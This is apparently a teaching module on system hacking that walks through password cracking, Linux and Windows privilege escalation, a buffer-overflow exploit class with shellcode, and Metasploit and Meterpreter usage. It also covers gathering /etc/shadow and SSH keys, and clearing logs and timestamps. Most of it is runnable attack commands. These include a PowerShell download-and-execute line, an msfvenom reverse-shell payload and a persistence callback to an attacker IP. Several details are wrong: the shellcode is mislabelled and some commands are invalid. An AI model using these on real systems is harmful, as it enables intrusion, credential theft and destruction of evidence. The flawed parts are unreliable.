# Module 6: System Hacking

## Overview

This module covers system hacking techniques - gaining access, maintaining foothold, and covering tracks. Learn password attacks, privilege escalation, and post-exploitation methods.

---

## 6.1 Password Attacks

### Password Cracking Fundamentals

```
Password Attack Types
─────────────────────

┌─────────────────┐
│  Passive        │
│  Attacks        │
└────────┬────────┘
         │
    ┌────┴────┐
    │         │
┌───┴───┐ ┌───┴────┐
│Online │ │Offline │
│Attack │ │Attack  │
└───┬───┘ └───┬────┘
    │         │
    │    ┌────┴────┐
    │    │         │
    │ ┌──┴──┐  ┌───┴────┐
    │ │Brute│  │Dictionary│
    │ │Force│  │Attack   │
    │ └─────┘  └─────────┘
```

### Dictionary Attacks

```bash
# Hydra - Online password cracker
hydra -L users.txt -P passwords.txt target.com ssh
hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Medusa
medusa -h target.com -U users.txt -P passwords.txt -M ssh

# Ncrack
ncrack -p 22 -U users.txt -P passwords.txt 192.168.1.1
```

### Hash Cracking

```bash
# John the Ripper
john --format=md5 hash.txt
john --wordlist=passwords.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 0 hash.txt wordlist.txt        # MD5
hashcat -m 1000 hash.txt wordlist.txt     # NTLM
hashcat -m 1800 hash.txt wordlist.txt     # sha512crypt
hashcat -a 3 hash.txt ?a?a?a?a?a?a        # Brute force

# Show cracked passwords
hashcat -m 0 hash.txt --show
```

### Creating Wordlists

```python
class WordlistGenerator:
    """Generate targeted wordlists"""
    
    def __init__(self):
        self.words = []
    
    def generate_from_target(self, target_info):
        """Generate wordlist from target info"""
        
        # Base words
        self.words.append(target_info['company'])
        self.words.append(target_info['domain'])
        self.words.extend(target_info.get('keywords', []))
        
        # Variations
        variations = []
        for word in self.words:
            variations.append(word)
            variations.append(word.upper())
            variations.append(word.lower())
            variations.append(word + "123")
            variations.append(word + "!")
            variations.append(word + "2024")
        
        return list(set(variations))
    
    def generate_cheap_passwords(self):
        """Generate most common passwords"""
        
        common = [
            "password", "123456", "12345678", "qwerty",
            "abc123", "monkey", "1234567", "letmein",
            "trustno1", "dragon", "baseball", "iloveyou",
            "master", "sunshine", "ashley", "bailey",
            "shadow", "123123", "654321", "superman",
            "qazwsx", "michael", "football", "password1",
            "password123", "welcome", "welcome1"
        ]
        
        return common
```

---

## 6.2 Privilege Escalation

### Linux Privilege Escalation

```bash
# Check current privileges
id
whoami
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Sudo misconfigurations
sudo -l
```

### Linux Escalation Script

```python
class LinuxPrivEsc:
    """Linux privilege escalation checker"""
    
    def __init__(self):
        self.findings = []
    
    def check_sudo(self):
        """Check sudo permissions"""
        # Check if user can run sudo without password
        # Look for NOPASSWD entries
        
        return []
    
    def check_suid(self):
        """Check SUID binaries"""
        
        suid_bins = [
            '/usr/bin/su',
            '/usr/bin/sudo',
            '/usr/bin/find',
            '/usr/bin/vim',
            '/usr/bin/less',
            '/usr/bin/nano'
        ]
        
        findings = []
        
        for bin_path in suid_bins:
            if os.path.exists(bin_path):
                stat = os.stat(bin_path)
                if stat.st_mode & 0o4000:
                    findings.append(f"SUID: {bin_path}")
        
        return findings
    
    def check_cron(self):
        """Check cron jobs"""
        
        cron_paths = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/var/spool/cron/'
        ]
        
        return []
    
    def check_capabilities(self):
        """Check Linux capabilities"""
        
        # getcap -r / 2>/dev/null
        pass
```

### Windows Privilege Escalation

```bash
# System info
systeminfo
whoami /all
whoami /priv

# Service permissions
sc query
sc qc service_name

# Writable services
icacls service.exe

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Unquoted service paths
wmic service get name,displayname,pathname,startmode

# Kernel exploits
whoami /groups
```

### Windows Escalation Tools

```bash
# WinPEAS
winpeas.exe

# PowerUp
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"

# Seatbelt
./Seatbelt.exe -group=system

# SharpUp
SharpUp.exe audit
```

---

## 6.3 Buffer Overflows

### Stack Overflow Basics

```
Memory Layout
────────────

High Address
┌────────────┐
│   Stack    │ ◄─── ESP
│            │
│            │
├────────────┤
│    Data    │
├────────────┤
│    Heap    │ ◄─── malloc
├────────────┤
│   Code     │
│  (Text)    │
└────────────┘
Low Address
```

### Simple Buffer Overflow

```python
# Vulnerable code example
def vulnerable_function(user_input):
    buffer = [0] * 64  # 64 byte buffer
    for i, char in enumerate(user_input):
        if i < 64:
            buffer[i] = char  # No bounds check!
    return "".join(buffer)

# Overflow demonstration
payload = "A" * 100
result = vulnerable_function(payload)
# Will overwrite adjacent memory
```

### Exploit Development Basics

```python
class ExploitDeveloper:
    """Basic exploit development"""
    
    def __init__(self, target_ip, target_port):
        self.target = (target_ip, target_port)
        self.egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x45\x33\x33\x89\xd7\xaf\x75\xea\xff\xe7"
    
    def create_payload(self):
        """Create buffer overflow payload"""
        
        # EIP offset
        offset = 146
        
        # Shellcode (calc.exe example)
        shellcode = (
            b"\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63"
            b"\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
        )
        
        # Padding
        padding = b"A" * offset
        
        # Return address
        ret = b"\x42\x42\x42\x42"
        
        payload = padding + ret + shellcode
        
        return payload
    
    def exploit(self):
        """Send exploit"""
        
        import socket
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(self.target)
        
        payload = self.create_payload()
        s.send(payload)
        
        s.close()
```

---

## 6.4 Metasploit Framework

### Metasploit Basics

```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:linux
search CVE-2024-1234

# Use exploit
use exploit/multi/handler
use exploit/linux/http/apache_struts

# Set options
set RHOSTS 192.168.1.100
set RPORT 80
set LHOST 192.168.1.50
set LPORT 4444

# Run exploit
run
exploit

# Create payload
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# Meterpreter
use payload Meterpreter
```

### Metasploit Modules

```
Metasploit Module Types
───────────────────────

┌────────────┐
│   Exploit  │ ─ Active exploits
├────────────┤
│   Payload  │ ─ Code to execute
├────────────┤
│  Auxiliary │ ─ Scanners, fuzzers
├────────────┤
│   Post     │ ─ Post-exploitation
├────────────┤
│  Encoder   │ ─ Obfuscation
├────────────┤
│   Nop      │ ─ Padding generation
└────────────┘
```

### Meterpreter Commands

```bash
# System commands
sysinfo
getuid
getprivs
shell

# Process commands
ps
migrate <pid>
kill <pid>

# File system
ls
cd /tmp
upload /local/file /remote/path
download /remote/file /local/path

# Privilege escalation
getsystem

# Persistence
run persistence -A -L /tmp -T -U -p 4444 -r 192.168.1.50

# Clearing tracks
clearev
```

---

## 6.5 Post-Exploitation

### Post-Exploit Activities

```bash
# Gather system info
uname -a
cat /etc/os-release
ls /etc/*release*

# Network information
netstat -antp
route
arp -a

# User information
cat /etc/passwd
cat /etc/shadow
last
w

# Credentials
joun /usr/share/john password.hashes

# Grabbing hashes
mimikatz
hashdump

# Pivoting
 portfwd add -l 3389 -p 3389 -r 192.168.2.55
 route add 192.168.2.0 255.255.255.0 1
```

### Data Exfiltration

```python
class DataExfiltrator:
    """Post-exploitation data gathering"""
    
    def __init__(self):
        self.targets = [
            '/etc/passwd',
            '/etc/shadow',
            '/home/*/.ssh',
            '/var/www',
            '**/*.sql',
            '**/*.db',
            '**/*credentials*'
        ]
    
    def find_sensitive_files(self):
        """Locate sensitive files"""
        
        import glob
        
        files = []
        
        for pattern in self.targets:
            files.extend(glob.glob(pattern, recursive=True))
        
        return files
    
    def exfiltrate(self, files):
        """Exfiltrate files"""
        
        # Compress
        # Encode
        # Transfer
        pass
```

---

## 6.6 Covering Tracks

### Log Clearing

```bash
# Linux
# Clear auth logs
> /var/log/auth.log
# Clear syslog
> /var/log/syslog
# Clear bash history
history -c
rm ~/.bash_history

# Windows
# Clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Meterpreter
clearev
timestomp file.txt -z "01/01/2020 12:00:00"
```

### Anti-Forensics

```python
class AntiForensics:
    """Anti-forensic techniques"""
    
    def timestamp_spoofing(self, file):
        """Modify file timestamps"""
        
        import os
        import time
        
        # Set to older date
        old_time = time.mktime((2020, 1, 1, 0, 0, 0, 0, 0, 0))
        os.utime(file, (old_time, old_time))
    
    def metadata_wiping(self, file):
        """Wipe file metadata"""
        
        # Remove EXIF, author, etc
        pass
```

---

## 6.7 Hands-On Lab

### Lab 6.1: Password Cracking

```python
#!/usr/bin/env python3
"""Simple password cracker demo"""

import hashlib

class PasswordCracker:
    def __init__(self, wordlist):
        with open(wordlist) as f:
            self.passwords = f.read().splitlines()
    
    def crack_md5(self, target_hash):
        """Crack MD5 hash"""
        
        for password in self.passwords:
            hashed = hashlib.md5(password.encode()).hexdigest()
            if hashed == target_hash:
                return password
        
        return None

if __name__ == "__main__":
    # Demo hash
    target = "5f4dcc3b5aa765d61d8327deb882cf99"  # password
    
    cracker = PasswordCracker("/usr/share/wordlists/rockyou.txt")
    result = cracker.crack_md5(target)
    print(f"Found: {result}")
```

---

## Module 6 Summary

### Key Takeaways

1. **Password attacks** use multiple techniques
2. **Privilege escalation** finds system weaknesses
3. **Buffer overflows** exploit memory vulnerabilities
4. **Metasploit** automates exploitation
5. **Post-exploitation** maximizes access
6. **Covering tracks** hides attacker presence

### Tools Summary

| Tool | Purpose |
|------|---------|
| Hydra | Online password attacks |
| John | Hash cracking |
| Metasploit | Exploitation framework |
| Meterpreter | Post-exploitation |

### Next Steps

Proceed to **Module 7: Web Application Security** for web-specific attacks.

---

## Quick Reference

```bash
# Quick password attack
hydra -l admin -P wordlist.txt target.com ssh

# Privilege escalation check
sudo -l
find / -perm -4000 2>/dev/null

# Metasploit
msfconsole
search linux smb
use exploit/multi/handler
```
